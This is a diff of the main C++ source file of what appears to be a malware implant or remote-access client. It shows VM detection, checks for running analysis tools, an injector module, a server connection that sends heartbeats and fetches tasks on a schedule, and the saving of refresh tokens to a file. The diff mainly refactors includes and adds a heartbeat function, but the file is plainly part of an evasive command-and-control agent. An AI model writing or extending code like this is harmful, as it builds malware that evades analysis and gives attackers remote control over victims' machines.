@@ -1,23 +1,20 @@
-#include <logger.hpp>
-
-import utility;
 import systemManager;
+import utility;
 
-#include <../integrity/AntiAnalysis.hpp>
-
-#include <../server/server.hpp>
-
+#include <../TaskScheduler/taskScheduler.hpp>
 #include <../injector/injector.hpp>
-#include <../taskScheduler/taskScheduler.hpp>
+#include <../integrity/AntiAnalysis.hpp>
+#include <../logger/logger.hpp>
+#include <../server/server.hpp>
 
 #include <fstream>
 #include <optional>
 #include <thread>
+#include <variant>
 
 #ifndef BASE_URL
 #define BASE_URL "http://0.0.0.0:8000" // default localhost
 #endif
-#include <string>
 
 #ifdef Debug
 constexpr int16_t DefaultRuntime = 1000;
@@ -38,12 +35,12 @@ SaveTokensCallback(const std::shared_ptr<std::string>& newRefreshToken,
     return;
   }
 
-  SetConsoleTitle(("ClientID: " + *clientId).c_str());
+  SetConsoleTitle(Utility::ConvertToWString("ClientID: " + *clientId).c_str());
 
   LOG_TRACE("SaveTokensCallback(" + *newRefreshToken + ", " + *clientId + ")");
 
-  System::SaveTokensToFile(ConvertToWString(*newRefreshToken),
-                           ConvertToWString(*clientId));
+  System::SaveTokensToFile(Utility::ConvertToWString(*newRefreshToken),
+                           Utility::ConvertToWString(*clientId));
   LOG_INFO("Refresh token and client ID saved to file via callback.");
 }
 
@@ -89,6 +86,15 @@ FetchAndPrintTasks(const Server::Session::Connect* connection) -> void
 }
 
 auto
+SendHeartbeat(const Server::Session::Connect* connection) -> int
+{
+  LOG_TRACE("Heartbeat sent to server.");
+  connection->Log(log_level::Info, "Heartbeat sent successfully.");
+
+  return 1;
+}
+
+auto
 main() -> int
 {
   LOG_ERROR("Checking VM");
@@ -98,8 +104,7 @@ main() -> int
   LOG_ERROR("No VM found");
   ApplicationController::InitEnv();
 
-  if (auto* tools = Integrity::AntiAnalysis::AnalysisToolsProcess();
-      tools != nullptr) {
+  if (auto* tools = AntiAnalysis::AnalysisToolsProcess(); tools != nullptr) {
     LOG_ERROR("Analysis Tools Found:");
 
     for (const auto& tool : *tools) {
@@ -158,10 +163,9 @@ main() -> int
   const std::chrono::milliseconds defaultHeartBeatDelay(DefaultHeartBeatDelay);
 
   int heartbeatResult = 0;
-  scheduler.AddTask(
-    [&connection] { return Utility::SendHeartbeat(connection); },
-    &defaultHeartBeatDelay,
-    &heartbeatResult);
+  scheduler.AddTask([&connection] { return SendHeartbeat(connection); },
+                    &defaultHeartBeatDelay,
+                    &heartbeatResult);
 
   const std::chrono::milliseconds fetchInterval(30000); // 30 seconds
   int fetchResult = 0;
